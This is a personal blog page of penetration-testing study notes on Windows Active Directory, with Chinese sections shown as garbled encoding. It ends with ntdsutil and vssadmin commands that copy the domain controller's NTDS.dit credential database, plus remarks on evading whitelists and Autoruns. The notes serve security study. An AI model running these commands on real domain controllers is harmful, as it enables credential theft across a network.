<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <title>Permeation Skills</title>
  <meta name="description" content="Basic Knowledge">
  <meta name="author" content="leopardpan">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Permeation Skills">
  <meta name="twitter:description" content="Basic Knowledge">

  <meta property="og:type" content="article">
  <meta property="og:title" content="Permeation Skills">
  <meta property="og:description" content="Basic Knowledge">

  <link rel="icon" type="image/png" href="images/favicon.png" />
  <link href="/images/favicon.png" rel="shortcut icon" type="image/png">

  <link rel="stylesheet" href="/css/main.css">
  <!-- <link href="//netdna.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet"> -->
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" integrity="sha384-UHRtZLI+pbxtHCWp1t77Bi1L4ZtiqrqD80Kn4Z8NTSRyMA2Fd33n5dQ8lWUE00s/" crossorigin="anonymous">

  <link rel="canonical" href="http://C0ldstudy.github.io/2018/09/Permeation_Skills/">
  <link rel="alternate" type="application/rss+xml" title="Jason Xu" href="http://C0ldstudy.github.io/feed.xml">

  <!-- kramdown-math-katex latex sytax for markdown -->
  <!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.2/dist/katex.min.css" integrity="sha384-yFRtMMDnQtDRO8rLpMIKrtPCD5jdktao2TV19YiZYWMDkUR5GQZR/NOVTdquEx1j" crossorigin="anonymous"> -->
  <!-- <script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.2/dist/katex.min.js" integrity="sha384-9Nhn55MVVN0/4OFx7EE5kpFBPsEMZxKTCnA+4fqDmg12eCTqGi6+BB2LjY8brQxJ" crossorigin="anonymous"></script>
  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.2/dist/contrib/auto-render.min.js" integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script> -->


<!-- ç«™ç‚¹ç»Ÿè®¡ -->
  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>


<!-- google ç»Ÿè®¡ -->
   
  <script>
      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
          (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
      ga('create', 'UA-118980599-1', 'auto');
      ga('send', 'pageview');
  </script>
  

</head>

  <body>
    <span class="mobile btn-mobile-menu">
      <div class="nav_container">
         <nav class="nav-menu-item" style = "float:right">
            <i class="nav-menu-item">
              <a href="/#blog" title="" class="blog-button">
                Homepage
              </a>
            </i>
            
                <i class="nav-menu-item">
                  <a href="/timeline" title="timeline" class="btn-mobile-menu__icon">
                      Timeline
                  </a>
                </i>
            
                <i class="nav-menu-item">
                  <a href="/tags" title="tags" class="btn-mobile-menu__icon">
                      Tag
                  </a>
                </i>
            
                <i class="nav-menu-item">
                  <a href="/photography" title="photography" class="btn-mobile-menu__icon">
                      Photography
                  </a>
                </i>
            
                <i class="nav-menu-item">
                  <a href="/about" title="about" class="btn-mobile-menu__icon">
                      About me
                  </a>
                </i>
            
          </nav>
      </div>
    </span>




    <header class="panel-cover panel-cover--collapsed" style="background-image: url('/images/background-cover.jpg')">
  <div class="panel-main">

    <div class="panel-main__inner panel-inverted">
    <div class="panel-main__content">
        <!-- å¤´åƒæ•ˆæœ-start -->
        <div class="ih-item circle effect right_to_left">
            <a href="/#blog" title="å‰å¾€ Jason Xu çš„ä¸»é¡µ" class="blog-button">
                <div class="img"><img src="/images/avatar.jpg" alt="img"></div>
                <div class="info">
                    <div class="info-back">
                        <h2>
                            
                                C0ldstudy
                            
                        </h2>
                        <p>
                           
                                Machine Learning / Security
                            
                        </p>
                    </div>
                </div>
            </a>
        </div>
        <!-- å¤´åƒæ•ˆæœ-end -->
        <h1 class="panel-cover__title panel-title"><a href="/#blog" title="link to homepage for Jason Xu" class="blog-button">Jason Xu</a></h1>
        
        <span class="panel-cover__subtitle panel-subtitle">Personal Station</span>
        
        <hr class="panel-cover__divider" />
        <p class="panel-cover__description">In the end, we only regret the chances we didn't take.</p>
        <hr class="panel-cover__divider panel-cover__divider--secondary" />
        
        <p class="panel-cover__description">ğŸ‡¨ğŸ‡³Shanghai -> ğŸ‡­ğŸ‡°Hong Kong -> ğŸ‡ºğŸ‡¸Irvine</p>
        


        <div class="navigation-wrapper">
          <div>
            <nav class="cover-navigation cover-navigation--primary">
              <ul class="navigation">
                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">Homepage</a></li>
                
                  <li class="navigation__item"><a href="/timeline" title="timeline">Timeline</a></li>
                
                  <li class="navigation__item"><a href="/tags" title="tags">Tag</a></li>
                
                  <li class="navigation__item"><a href="/photography" title="photography">Photography</a></li>
                
                  <li class="navigation__item"><a href="/about" title="about">About me</a></li>
                
              </ul>
            </nav>
          </div>
        </div>


        </div>
      </div>
    </div>

    
    <div class="panel-cover--overlay cover-clear"></div>
    
  </div>
</header>


    <div class="content-wrapper">
        <div class="content-wrapper__inner">
            


<article class="post-container post-container--single" itemscope itemtype="http://schema.org/BlogPosting">
  <header class="post-header">
    <h1 class="post-title">Permeation Skills</h1>
    <div class="post-meta">
      <img src="/images/calendar.png" width="20px"/>
      <time datetime="2018-09-22 00:00:00 -0700" itemprop="datePublished" class="post-meta__date date">2018-09-22 | </time>
      <span id="busuanzi_container_page_pv" style='display:none'> Read: <span id="busuanzi_value_page_pv"></span> Times</span>

    </div>
  </header>

  <section class="post">

    <h3 id="basic-knowledge">Basic Knowledge</h3>

<ol>
  <li>Active Directory Domain Services is Microsoftâ€™s Directory Server. It provides authentication and authorization mechanisms as well as a framework within which other related services can be deployed (AD Certificate Services, AD Federated Services, etc).</li>
  <li>COM</li>
</ol>

<h3 id="lan-information-collection">LAN Information Collection</h3>

<ol>
  <li>
    <p><a href="https://docs.microsoft.com/en-us/windows/desktop/wmisdk/wmic">WMIC</a>(Windows Management Instructure Commands): WMI provides users with information about the status of local or remote computer systems and supports. It contains aliases, verbs, switches, and commands.</p>

    <ul>
      <li><code class="language-plaintext highlighter-rouge">net config workstation</code>: Search for the local machineâ€™s domain</li>
    </ul>
  </li>
  <li>
    <p>nltest: NLTEST.EXE is a very powerful command-line utility that can be used to test Trust relationships and the state of Domain Controller replication in a Microsoft Windows NT Domain.</p>
  </li>
</ol>

<h3 id="password-acquirement">Password Acquirement</h3>
<ol>
  <li>Brute Force Tools:
    <ul>
      <li>SMBCrack2(2005)</li>
      <li>Hydra</li>
    </ul>
  </li>
  <li>Mimikatz: require the administrator privilege</li>
</ol>

<h3 id="kerberoast-attack">Kerberoast Attack</h3>

<ol>
  <li>Kerberroast Attack</li>
</ol>

<h3 id="mitm">MITM</h3>

<p>LLMNR/NBNSæ¬ºéª— + WPADåè®®
Tools: Responder</p>

<h3 id="domain-management-privilege-maintainning">Domain Management Privilege Maintainning</h3>

<ol>
  <li>Golden Ticket</li>
  <li>Silver Ticket</li>
</ol>

<h3 id="tutorial-start-up-a-active-directory">Tutorial: Start-up a active directory</h3>

<ul>
  <li>run <code class="language-plaintext highlighter-rouge">dcpromo</code></li>
  <li>set password and other procedures</li>
</ul>

<hr />

<h2 id="windows-server-2008-ç»„ç½‘æŠ€æœ¯ä¸åº”ç”¨è¯¦è§£">Windows Server 2008 ç»„ç½‘æŠ€æœ¯ä¸åº”ç”¨è¯¦è§£</h2>

<h3 id="1-æ´»åŠ¨ç›®å½•åŸŸæœåŠ¡">1. æ´»åŠ¨ç›®å½•åŸŸæœåŠ¡</h3>
<h4 id="11-adåŸŸæœåŠ¡">1.1 ADåŸŸæœåŠ¡</h4>

<p>ADåŸŸæœåŠ¡ç”¨äºæœ¬åœ°ç½‘ç»œæ´»åŠ¨ç›®æ ‡çš„ç®¡ç†ï¼ŒåŒ…å«ï¼š</p>

<ul>
  <li>åªè¯»å‹åŸŸæ§åˆ¶å™¨ RODC</li>
  <li>RMS(æƒé™ç®¡ç†æœåŠ¡)</li>
  <li>è”åˆèº«ä»½éªŒè¯æœåŠ¡</li>
  <li>è½»å‹ç›®å½•æœåŠ¡å™¨</li>
  <li>è¯ä¹¦æœåŠ¡</li>
</ul>

<p>æ´»åŠ¨ç›®å½•è´Ÿè´£ç›®å½•æ•°æ®åº“ï¼ˆå³C:\windows\ntds\ntds.ditï¼‰çš„æ“ä½œï¼Œæ–¹ä¾¿ç”¨æˆ·æ‰¾å¯»æ•°æ®ã€‚æ´»åŠ¨ç›®å½•å­˜å‚¨åœ¨åŸŸæ§åˆ¶å™¨ä¸­ã€‚æ¯ä¸ªåŸŸæœ‰ä¸€ä¸ªæˆ–å¤šä¸ªåŸŸæ§åˆ¶å™¨ï¼ˆåŒä¸€ä¸ªåŸŸå†…æ¯ä¸ªæ§åˆ¶å™¨ä¸­çš„æ´»åŠ¨ç›®å½•ç›¸åŒï¼‰ï¼Œåˆ†æ‹…å·¥ä½œå’Œä»»åŠ¡ã€‚åŸŸæ§åˆ¶å™¨ç®¡ç†æ‰€æœ‰ç½‘ç»œè®¿é—®ã€‚æ´»åŠ¨ç›®å½•å¯ä»¥åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªåŸŸï¼ˆåŸŸæ—ï¼‰ã€‚</p>

<h4 id="12-ç»“æ„">1.2 ç»“æ„</h4>

<p>1.2.1 é€»è¾‘ç»“æ„ï¼š</p>

<ul>
  <li>åŸŸ</li>
  <li>ç»„ç»‡å•å…ƒï¼šå®¹å™¨å¯¹è±¡ï¼Œå±€é™äºåŸŸçš„å†…éƒ¨</li>
  <li>åŸŸæ ‘ï¼šè¿ç»­å‘½åç©ºé—´çš„å±‚æ¬¡ç»“æ„</li>
  <li>åŸŸæ—ï¼šä¸å…±äº«è¿ç»­å‘½åç©ºé—´çš„åŸŸæ ‘ç»„æˆ</li>
</ul>

<p>1.2.2 ç‰©ç†ç»“æ„</p>

<ul>
  <li>ç«™ç‚¹</li>
  <li>åŸŸæ§åˆ¶å™¨ï¼šå¤šä¸»æœºå¤åˆ¶ï¼Œä½†ä»éœ€æŒ‡å®šå…¨å±€ç›®å½•æœåŠ¡å™¨</li>
</ul>

<p>1.2.3 é¢å¤–åŸŸã€å­åŸŸä¸ä¿¡ä»»å…³ç³»</p>

<ul>
  <li>é¢å¤–åŸŸæ§åˆ¶å™¨ï¼šä¸»åŸŸæ§åˆ¶å™¨çš„å¤‡ä»½å’Œè¾…åŠ©</li>
  <li>ä¿¡ä»»å…³ç³»ï¼š
    <ul>
      <li>å¯ä¼ é€’ä¿¡ä»»ã€
        <ul>
          <li>å¿«æ·ä¿¡ä»»</li>
          <li>æ—ä¿¡ä»»</li>
          <li>é¢†åŸŸä¿¡ä»»</li>
        </ul>
      </li>
      <li>éå¯ä¼ é€’ä¿¡ä»»</li>
    </ul>
  </li>
</ul>

<h3 id="2-ç”¨æˆ·ä¸ç»„ç­–ç•¥">2. ç”¨æˆ·ä¸ç»„ç­–ç•¥</h3>

<h4 id="21-ç”¨æˆ·ä¸ç»„ç®¡ç†">2.1 ç”¨æˆ·ä¸ç»„ç®¡ç†</h4>
<ul>
  <li>ç”¨æˆ·ç»„
    <ul>
      <li>ç³»ç»Ÿé»˜è®¤ç»„</li>
      <li>æ–°ç»„</li>
    </ul>
  </li>
  <li>ç»„ç»‡å•å…ƒ</li>
  <li>é…ç½®æ–‡ä»¶</li>
</ul>

<h4 id="22-ç»„ç­–ç•¥å’Œåº”ç”¨">2.2 ç»„ç­–ç•¥å’Œåº”ç”¨</h4>
<p>ä»‹äºæ§åˆ¶é¢æ¿å’Œæ³¨å†Œè¡¨ä¹‹é—´çš„ä¿®æ”¹ç³»ç»Ÿã€è®¾ç½®ç¨‹åºçš„å·¥å…·ã€‚</p>

<ul>
  <li>ç»„ç­–ç•¥å¯¹è±¡ç»„ä»¶ GPO
    <ul>
      <li>ç»„ç­–ç•¥å®¹å™¨ç»„ä»¶ GPC</li>
      <li>ç»„ç­–ç•¥æ¨¡æ¿ç»„ä»¶ GPT</li>
    </ul>
  </li>
  <li>å®¢æˆ·ç«¯æ‹“å±•ç»„ä»¶ CSE</li>
  <li>ç»„ç­–ç•¥ç¼–è¾‘å™¨ç»„ä»¶ GPE</li>
  <li>è®¡ç®—æœºç­–ç•¥å’Œç”¨æˆ·ç­–ç•¥ç»„ä»¶</li>
  <li>ç»„ç­–ç•¥å’Œæœ¬åœ°ç­–ç•¥ç»„ä»¶</li>
</ul>

<h3 id="3-dhcpæœåŠ¡ä¸dnsæœåŠ¡">3. DHCPæœåŠ¡ä¸DNSæœåŠ¡</h3>

<p>3.1 æ¦‚å¿µåŠ¨æ€ä¸»æœºåˆ†é…åè®®ï¼Œæ–¹ä¾¿å®¢æˆ·ç«¯æ‰¹é‡è‡ªåŠ¨è·å–IPåœ°å€ï¼Œå…¶ç§Ÿå€Ÿè¿‡ç¨‹å¦‚ä¸‹ï¼š</p>

<ul>
  <li>å®¢æˆ·ç«¯ä»¥0.0.0.0ä½œä¸ºè‡ªå·±çš„IPåœ°å€ï¼Œ255.255.255.255ä½œä¸ºDHCPæœåŠ¡å™¨åœ°å€ï¼Œå¹¿æ’­DHCPå‘ç°ä¿¡æ¯ï¼ŒåŒ…å«ç½‘å¡Macåœ°å€å’ŒNetBIOSåç§°ã€‚</li>
  <li>æ¯éš”ä¸€æ®µæ—¶é—´å‘é€ä¸€æ¬¡ç›´åˆ°æ”¶åˆ°å›å¤ï¼Œæˆ–è€…è‡ªåŠ¨é€‰å®šä¿ç•™IPåœ°å€æ®µçš„ä¸€ä¸ªï¼Œä¿è¯æ²¡æœ‰DHCPæœåŠ¡å™¨ç½‘ç»œä»èƒ½è¿è¡Œã€‚</li>
  <li>å®¢æˆ·å•æ”¶åˆ°ç¬¬ä¸€ä¸ªè¯·æ±‚åä»¥å¹¿æ’­æ–¹å¼å‘ŠçŸ¥æ‰€æœ‰æœåŠ¡å™¨ã€‚</li>
</ul>

<p>3.2 åœ¨æœåŠ¡å™¨ä¸­ï¼Œä»¥IPä½œç”¨åŸŸä½œä¸ºåŸºæœ¬ç®¡ç†å•ä½ã€‚IPä½œç”¨åŸŸå°±æ˜¯ç½‘ç»œä¸­å¯ç®¡ç†çš„IPåœ°å€åˆ†ç»„ã€‚è¶…çº§ä½œç”¨åŸŸæ˜¯DHCPæœåŠ¡å™¨ä¸Šæœ‰å¤šä¸ªä½œç”¨åŸŸï¼Œç”¨äºå¤šç½‘é…ç½®ã€‚</p>

<p>3.3 DHCPä¸­ç»§ä»£ç†ï¼šå°†è¯·æ±‚å‘é€åˆ°è¿œç«¯çš„DHCPæœåŠ¡å™¨ä¸Šã€‚</p>

<p>3.4 åŸŸåç³»ç»Ÿï¼Œå®ç°åç§°ä¸IPåœ°å€çš„è½¬æ¢ï¼Œä¸»è¦åŒ…æ‹¬ï¼š</p>

<ul>
  <li>DNSåŸŸå‘½åç©ºé—´</li>
  <li>èµ„æºè®°å½•</li>
  <li>æœåŠ¡å™¨</li>
  <li>å®¢æˆ·ç«¯</li>
</ul>

<p>3.5 æŸ¥è¯¢æ¨¡å¼ï¼šé€’å½’æŸ¥è¯¢ã€è¿­ä»£æŸ¥è¯¢ã€åå‘æŸ¥è¯¢</p>

<h3 id="4-æ–‡ä»¶æœåŠ¡ä¸è¯ä¹¦æœåŠ¡">4. æ–‡ä»¶æœåŠ¡ä¸è¯ä¹¦æœåŠ¡</h3>

<p>4.1 é€šè¿‡æ–‡ä»¶æœåŠ¡å™¨ï¼Œè®¾ç½®å…±äº«æ–‡ä»¶å¤¹ï¼Œå¹¶ç»™äºˆä¸åŒç”¨æˆ·ä¸åŒçš„æƒé™ã€‚å¦å¤–ï¼Œå¯ä»¥ä½¿ç”¨èµ„æºç®¡ç†å™¨å®ç°æ–‡ä»¶å…±äº«ï¼›é€šè¿‡è„±æœºè®¾ç½®å®ç°ç¦»çº¿è®¿é—®å…±äº«èµ„æºã€‚</p>

<p>4.2 èµ„æºè®¿é—®æƒé™çš„æ§åˆ¶ï¼šNTFSã€‚NTFSæ˜¯ä»Windows NTå¼€å§‹å¼•å…¥çš„æ–‡ä»¶ç³»ç»Ÿï¼Œå¯ä»¥ä¸ºæ–‡ä»¶å¤¹å’Œæ–‡ä»¶æˆæƒï¼Œæ”¯æŒæ•°æ®å‹ç¼©å’Œç£ç›˜é™é¢ï¼Œä½†ä¸é€‚ç”¨ä¸FATæˆ–FAT32æ–‡ä»¶ç³»ç»Ÿ</p>

<p>4.3 ç£ç›˜é…é¢ï¼šä»¥æ–‡ä»¶æ‰€æœ‰æƒä¸ºåŸºç¡€ï¼Œåªåº”ç”¨äºå·å¹¶ç›‘è§†ä¸ªäººç”¨æˆ·å·çš„ä½¿ç”¨æƒ…å†µã€‚</p>

<p>4.4 åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿ DFSï¼šä¸ºæ‰€æœ‰å…±äº«æ–‡ä»¶æä¾›è®¿é—®ç‚¹å’Œé€»è¾‘æ ‘ç»“æ„ï¼Œä¿è¯æœåŠ¡ç¨³å®šã€‚</p>

<ul>
  <li>ç‹¬ç«‹çš„æ ¹ç›®å½•åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿï¼šç›®å½•ä¿¡æ¯å­˜å‚¨åœ¨æœ¬åœ°ä¸»æœåŠ¡å™¨ä¸Šã€‚æ²¡æœ‰æ ¹çº§åˆ«çš„å®¹é”™ï¼Œå³æ ¹ä¸å¯è¾¾åˆ™æ•´ä¸ªç©ºé—´ä¸å¯è®¿é—®ã€‚</li>
  <li>åŸŸåˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿï¼šæ‹“æ‰‘ä¿¡æ¯å­˜å‚¨åœ¨æ´»åŠ¨ç›®å½•ADä¸­ã€‚</li>
</ul>

<p>4.5 æ•°å­—è¯ä¹¦æ˜¯ç”±è¯ä¹¦é¢å‘æœºæ„ï¼ˆCertification Authorityï¼‰æ•°å­—ç­¾åçš„ã€åŒ…å«ç”¨æˆ·èº«ä»½ä¿¡æ¯å’Œç”¨æˆ·å…¬é’¥ä¿¡æ¯ä»¥åŠèº«ä»½éªŒè¯æœºæ„æ•°å­—ç­¾åçš„æ•°æ®ã€‚</p>
<ul>
  <li>èº«ä»½éªŒè¯æœºæ„çš„æ•°å­—ç­¾åç¡®ä¿ä¿¡æ¯çœŸå®æ€§</li>
  <li>ç”¨æˆ·å…¬é’¥ä¿¡æ¯ç¡®ä¿å®Œæ•´æ€§</li>
  <li>ç”¨æˆ·æ•°å­—ç­¾åç¡®ä¿ä¸å¯å¦è®¤æ€§</li>
</ul>

<p><strong><em>æ³¨æ„ï¼š</em></strong>Windows 2008ä½¿ç”¨å…¬å…±å¯†é’¥åŸºç¡€ç»“æ„ï¼ˆPublic Key Infrastructureï¼‰ï¼Œå³éå¯¹ç§°åŠ å¯†æŠ€æœ¯ã€‚
æ³¨æ„ï¼Œéƒ¨ç½²äº†è¯ä¹¦æœåŠ¡å™¨åï¼ŒæœåŠ¡å™¨çš„è®¡ç®—æœºåå’ŒåŸŸåä¸èƒ½æ›´æ”¹ï¼Œä½†å¯ä»¥æ›´æ”¹IPåœ°å€ã€‚</p>

<h3 id="5-æ´»åŠ¨ç›®å½•æƒé™ç®¡ç†æœåŠ¡ad-right-management-services">5. æ´»åŠ¨ç›®å½•æƒé™ç®¡ç†æœåŠ¡ï¼ˆAD Right Management Servicesï¼‰</h3>

<p>ç›¸å…³ç»„ä»¶ï¼šåº”ç”¨ç¨‹åºã€æœåŠ¡å™¨ã€å®¢æˆ·ç«¯</p>

<h4 id="51-æƒé™ç®¡ç†è´¦å·è¯ä¹¦ç”Ÿæˆè¿‡ç¨‹">5.1 æƒé™ç®¡ç†è´¦å·è¯ä¹¦ç”Ÿæˆè¿‡ç¨‹ï¼š</h4>
<ol>
  <li>ç”¨æˆ·ç¬¬ä¸€æ¬¡ä½¿ç”¨åŠ å¯†æ–‡æ¡£ä¹‹å‰ï¼Œéœ€è¦åŸŸç”¨æˆ·èº«ä»½å‘AD RMSæœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œè·å–è¯ä¹¦ã€‚</li>
  <li>æœåŠ¡å™¨æ•°æ®åº“ï¼Œè‹¥å¯†é’¥å·²ç»å­˜åœ¨åˆ™ä½¿ç”¨è¯¥å¯†é’¥ï¼Œå¦åˆ™æ–°å»ºã€‚</li>
  <li>æœåŠ¡å™¨å°†ç”¨æˆ·å¯†é’¥ä¸­ç§é’¥ç”¨æœåŠ¡å™¨çš„ç§é’¥åŠ å¯†ï¼Œå¹¶å°†å…¬é’¥å’ŒåŠ å¯†äº†çš„ç§é’¥æ”¾åˆ°æƒé™ç®¡ç†è´¦æˆ·è¯ä¹¦ä¸­ã€‚</li>
  <li>æƒé™ç®¡ç†è´¦æˆ·è¯ä¹¦è¢«æœåŠ¡å™¨ç”¨ç§é’¥ç­¾åï¼Œå¹¶å‘é€ç»™ç”¨æˆ·ã€‚</li>
  <li>æœåŠ¡å™¨å°†ç”¨æˆ·çš„å¯†é’¥å¯¹å­˜å‚¨åˆ°AD RMSæ•°æ®åº“ä¸­ã€‚</li>
</ol>

<h4 id="52-ad-rmså®ç°åŸç†">5.2 AD RMSå®ç°åŸç†</h4>

<p>5.1.1 æœåŠ¡çš„å‘ç°
5.1.2 æ–‡æ¡£åœ¨çº¿å‘å¸ƒè¿‡ç¨‹
5.1.3 æ–‡æ¡£ç¦»çº¿å‘å¸ƒè¿‡ç¨‹
5.1.4 å—ä¿æŠ¤æ–‡æ¡£ä½¿ç”¨è¿‡ç¨‹</p>

<h3 id="æœåŠ¡å™¨è™šæ‹ŸåŒ–hyper-v">æœåŠ¡å™¨è™šæ‹ŸåŒ–ï¼ˆHyper-Vï¼‰</h3>
<p>ä¸è™šæ‹Ÿæœºä¸åŒï¼ŒHyper-Vç®¡ç†çš„è™šæ‹Ÿæœºç›´æ¥è¿è¡Œåœ¨åº•å±‚ï¼Œç›¸å½“äºç‹¬ç«‹çš„è®¡ç®—æœºã€‚</p>

<h3 id="ç½‘ç»œè®¿é—®ä¿æŠ¤network-access-protection">ç½‘ç»œè®¿é—®ä¿æŠ¤ï¼ˆNetwork Access Protectionï¼‰</h3>
<p>æ£€æŸ¥è”å…¥å†…ç½‘çš„ç”µè„‘æ˜¯å¦å®‰å…¨ï¼Œåˆ†ä¸º4ä¸ªéƒ¨åˆ†ï¼š</p>
<ul>
  <li>ç­–ç•¥éªŒè¯</li>
  <li>éš”ç¦»</li>
  <li>è¡¥æ•‘</li>
  <li>æŒç»­ç›‘æ§</li>
</ul>

<h3 id="é˜²ç«å¢™">é˜²ç«å¢™</h3>

<p>IPSecä»Windows Server 2003å¼€å§‹ä½¿ç”¨ï¼Œä½äºç½‘ç»œå±‚ï¼Œå¯ä»¥é˜²æ­¢ä¸­é—´äººæ”»å‡»ã€æ¢æµ‹æ”»å‡»ã€é‡æ”¾æ”»å‡»ã€æœªè®¤è¯çš„ç½‘ç»œåº”ç”¨ç¨‹åºè®¿é—®ã€åªé€‚ç”¨IPåœ°å€è®¤è¯çš„ç½‘ç»œåº”ç”¨ç¨‹åºçš„è®¿é—®ã€‚IPSecæœ‰ä¸¤ç§æ¨¡å¼ï¼šä¼ è¾“æ¨¡å¼å’Œé€šé“æ¨¡å¼ã€‚IPSecä½¿ç”¨ä¸¤ç§åè®®ï¼šAHå’ŒESPã€‚</p>

<p>Internetå¯†é’¥äº¤æ¢åè®®ï¼ˆIKEï¼‰ï¼šInternetå®‰å…¨å…³è”å’Œå¯†é’¥ç®¡ç†åè®®ï¼ˆISAKMPï¼‰å’ŒOakleyé‡‘é’¥äº¤æ¢åè®®çš„ç»„åˆï¼Œåˆ†ä¸º3ä¸ªæ¨¡å¼ï¼šä¸»æ¨¡å¼ã€å¿«é€Ÿæ¨¡å¼å’Œç”¨æˆ·æ¨¡å¼ã€‚</p>

<hr />

<h2 id="ata90-days-free-trial">ATA[90 days free trial]</h2>

<p>The Advanced Threat Analytics is a platform to protect the system from cyber attacks. The informatino collected by ATA via:</p>

<ul>
  <li>Port mirroring from DC and DNS server to the ATA gateway</li>
  <li>Deploy gateway on Domian Controller</li>
</ul>

<p>ATA receives events and log from:</p>

<ul>
  <li>SIEM intergration</li>
  <li>Windows Event Forwarding</li>
</ul>

<p>ATA detects suspicious activities:</p>

<ul>
  <li>Reconnaissance</li>
  <li>Lateral movement cycle</li>
  <li>Domain dominance (persistence)</li>
</ul>

<p>which including:</p>

<ul>
  <li>Pass-the-Ticket (PtT)</li>
  <li>Pass-the-Hash (PtH)</li>
  <li>Overpass-the-Hash</li>
  <li>Forged PAC (MS14-068)</li>
  <li>Golden Ticket</li>
  <li>Malicious replications</li>
  <li>Reconnaissance</li>
  <li>Brute Force</li>
  <li>Remote execution</li>
</ul>

<hr />

<h2 id="ä¸‰å¥½å­¦ç”ŸåŸŸæ¸—é€æ–‡ç« å¤ç°ä¸æ€»ç»“">ä¸‰å¥½å­¦ç”ŸåŸŸæ¸—é€æ–‡ç« å¤ç°ä¸æ€»ç»“</h2>

<h3 id="1-åŸŸæ¸—é€è·å¾—åŸŸæ§æœåŠ¡å™¨çš„ntdsditæ–‡ä»¶">1. åŸŸæ¸—é€â€”â€”è·å¾—åŸŸæ§æœåŠ¡å™¨çš„NTDS.ditæ–‡ä»¶</h3>

<h4 id="11-é€šè¿‡vssæœåŠ¡ä¸‹çš„å‘½ä»¤è·å¾—åŸŸæ§æœåŠ¡å™¨ntdsditæ–‡ä»¶">1.1 <a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E8%8E%B7%E5%BE%97%E5%9F%9F%E6%8E%A7%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84NTDS.dit%E6%96%87%E4%BB%B6/">é€šè¿‡VSSæœåŠ¡ä¸‹çš„å‘½ä»¤è·å¾—åŸŸæ§æœåŠ¡å™¨NTDS.ditæ–‡ä»¶</a></h4>

<p><strong>Concepts</strong>ï¼šVolume Shadow Copy Service <em>(Volume Snapshot Service)</em> used in manual or automatic backup copies even when they are in use. It contains a set of COM interfaces that implements a framework to allow volume backups to be performed while applications on a system continue to write to the volumes.</p>

<p>æ”¯æŒWindows 2003ä»¥ä¸Šæ“ä½œç³»ç»Ÿ</p>

<p>1.1.1 ä½¿ç”¨ntdsutilå®ç°ä»snapshotä¸­å¾—åˆ°ntds.dit</p>

<p>æ”¯æŒWindows 2003ä»¥ä¸Šçš„ç³»ç»Ÿ</p>

<ul>
  <li>create snapshotï¼š<code class="language-plaintext highlighter-rouge">ntdsutil snapshot "activate instance ntds" create quit quit</code></li>
  <li>load the snapshot: <code class="language-plaintext highlighter-rouge">ntdsutil snapshot "mount {ef0cadb1-a0f0-46c2-a4de-d6faaef0e199}" quit quit</code></li>
  <li>copy ntds.dit: <code class="language-plaintext highlighter-rouge">copy C:\$SNAP_201810291848_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit</code></li>
  <li>unload the snapshot: <code class="language-plaintext highlighter-rouge">ntdsutil snapshot  "unmount {ef0cadb1-a0f0-46c2-a4de-d6faaef0e199}" quit quit</code></li>
  <li>delete the snapshot: <code class="language-plaintext highlighter-rouge">ntdsutil snapshot  "delete {ef0cadb1-a0f0-46c2-a4de-d6faaef0e199}" quit quit</code></li>
</ul>

<p>æ³¨æ„ï¼šä½¿ç”¨VSSæœåŠ¡ä¼šäº§ç”Ÿæ—¥å¿—ï¼ŒIDä¸º7036ã€‚create snapshotä¼šäº§ç”Ÿæ—¥å¿—IDä¸º7036(å®é™…æµ‹è¯•æ—¶å¹¶æœªå‘ç°)ã€‚</p>

<p>1.1.2 vssadmin</p>

<p>æ”¯æŒwindows 2008ä»¥ä¸Šç³»ç»Ÿ</p>

<ul>
  <li>search current existing shadow: <code class="language-plaintext highlighter-rouge">vssadmin list shadows</code></li>
  <li>create the shadow: <code class="language-plaintext highlighter-rouge">vssadmin create shadow /for=c:</code></li>
  <li>copy ntds.dit: <code class="language-plaintext highlighter-rouge">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\NTDS\ntds.dit c:\ntds.dit</code></li>
  <li>delete the shadow: <code class="language-plaintext highlighter-rouge">vssadmin delete shadows /for=c: /quiet</code></li>
</ul>

<p>1.1.3 <a href="https://docs.microsoft.com/en-us/windows/desktop/VSS/vshadow-tool-and-sample">vshadow.exe</a></p>

<p>ç³»ç»Ÿé»˜è®¤æœªå®‰è£…ï¼Œéœ€è¦åœ¨Microsoft Windows Software Development Kit (SDK)ä¸­è·å–ã€‚vshadow.exeåŒ…å«å¾®è½¯ç­¾åï¼Œèƒ½ç»•è¿‡æŸäº›ç™½åå•çš„é™åˆ¶ã€‚
å¦‚æœä½œä¸ºå¯åŠ¨é¡¹ï¼ŒAutorunsçš„é»˜è®¤å¯åŠ¨åˆ—è¡¨ä¸æ˜¾ç¤ºã€‚</p>

<p><a href="https://bohops.com/2018/02/10/vshadow-abusing-the-volume-shadow-service-for-evasion-persistence-and-active-directory-database-extraction/">Tutorial</a></p>

<p>1.1.4 <a href="https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs">vssown.vbs</a></p>

